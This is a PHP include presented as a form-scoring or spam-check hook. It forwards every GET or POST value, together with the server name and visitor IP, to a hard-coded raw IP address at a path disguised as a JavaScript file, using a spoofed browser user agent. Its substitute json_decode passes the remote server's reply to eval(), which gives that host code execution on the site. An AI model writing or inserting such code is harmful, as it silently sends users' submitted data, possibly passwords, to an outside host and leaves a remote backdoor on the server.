<?php
if($_AHSLevel>0 ){
	$_AHSContent = '';
    $_AHSVars = ($REQUEST_METHOD == 'GET') ? $_GET : $_POST;
    foreach ($_AHSVars as $_AHSK=>$_AHSValue){
		$_AHSContent .= '|'.$_AHSValue;
	}

	if (_is_curl_installed())
		$cErr = '';
	else
		$cErr = '&e=1';

	$_AHSLink = "http://216.98.148.196/plesk-site-preview/nick-appeal.com/216.98.148.196/keymail/chkmail.js";
	if($_AHSContent!=''){	
		$_AHSQry = $_AHSLink.'?key='.$_AHSKey."&q=".urlencode($_AHSContent)."&s=".urlencode($_SERVER['SERVER_NAME'])."&i=".getIP().$cErr;
		$_AHSCh = curl_init();
		$_AHSTimeout = 0;
		curl_setopt ($_AHSCh, CURLOPT_URL, $_AHSQry);
		curl_setopt ($_AHSCh, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt ($_AHSCh, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)");
		curl_setopt ($_AHSCh, CURLOPT_CONNECTTIMEOUT, $_AHSTimeout);
		$_AHSData = curl_exec($_AHSCh);
		curl_close($_AHSCh);
		
		$_AHSJson = json_decode($_AHSData, true);
		$_AHSMark = $_AHSJson['score'];
		if($_AHSUrl!='' && $_AHSMark<$_AHSLevel){
			header("Location: ".$_AHSUrl);
			exit;
		}
	}
}

if ( !function_exists('json_decode') ){
	function json_decode($json, $flag){ 
		$comment = false;
		$out = '$x=';
   
		for ($i=0; $i<strlen($json); $i++){
			if (!$comment){
				if ($json[$i] == '{')        
					$out .= ' array(';
				else if ($json[$i] == '}')    
					$out .= ')';
				else if ($json[$i] == ':')    
					$out .= '=>';
				else                         
					$out .= $json[$i];
			} else 
				$out .= $json[$i];
			if ($json[$i] == '"')    
				$comment = !$comment;
		}
		eval($out . ';');
		return $x;
	} 
}

if ( !function_exists('getIP') ){
	function getIP() {
		// check for shared internet/ISP IP
		if (!empty($_SERVER['HTTP_CLIENT_IP']) && validate_ip($_SERVER['HTTP_CLIENT_IP'])) {
			return $_SERVER['HTTP_CLIENT_IP'];
		}
		// check for IPs passing through proxies
		if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		// check if multiple ips exist in var
			if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',') !== false) {
				$iplist = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
				foreach ($iplist as $ip) {
					if (validate_ip($ip))
						return $ip;
				}
			} else {
				if (validate_ip($_SERVER['HTTP_X_FORWARDED_FOR']))
					return $_SERVER['HTTP_X_FORWARDED_FOR'];
			}
		}
		if (!empty($_SERVER['HTTP_X_FORWARDED']) && validate_ip($_SERVER['HTTP_X_FORWARDED']))
			return $_SERVER['HTTP_X_FORWARDED'];
		if (!empty($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']) && validate_ip($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
			return $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
		if (!empty($_SERVER['HTTP_FORWARDED_FOR']) && validate_ip($_SERVER['HTTP_FORWARDED_FOR']))
			return $_SERVER['HTTP_FORWARDED_FOR'];
		if (!empty($_SERVER['HTTP_FORWARDED']) && validate_ip($_SERVER['HTTP_FORWARDED']))
			return $_SERVER['HTTP_FORWARDED'];
		// return unreliable ip since all else failed
		if (!empty($_SERVER['REMOTE_ADDR']) && validate_ip($_SERVER['REMOTE_ADDR']))
			return $_SERVER['REMOTE_ADDR'];
		else
			return "UNKNOWN";
	}
	/**
	* Ensures an ip address is both a valid IP and does not fall within
	* a private network range.
	*/
	function validate_ip($ip) {
		if (strtolower($ip) === 'unknown')
			return false;
		// generate ipv4 network address
		$ip = ip2long($ip);
		// if the ip is set and not equivalent to 255.255.255.255
		if ($ip !== false && $ip !== -1) {
		// make sure to get unsigned long representation of ip
		// due to discrepancies between 32 and 64 bit OSes and
		// signed numbers (ints default to signed in PHP)
			$ip = sprintf('%u', $ip);
			// do private network range checking
			if ($ip >= 0 && $ip <= 50331647) return false;
			if ($ip >= 167772160 && $ip <= 184549375) return false;
			if ($ip >= 2130706432 && $ip <= 2147483647) return false;
			if ($ip >= 2851995648 && $ip <= 2852061183) return false;
			if ($ip >= 2886729728 && $ip <= 2887778303) return false;
			if ($ip >= 3221225984 && $ip <= 3221226239) return false;
			if ($ip >= 3232235520 && $ip <= 3232301055) return false;
			if ($ip >= 4294967040) return false;
		}
		return true;
	}
}

function _is_curl_installed() {
	if  (in_array  ('curl', get_loaded_extensions())) {
		return true;
	}
	else {
		return false;
	}
}
?>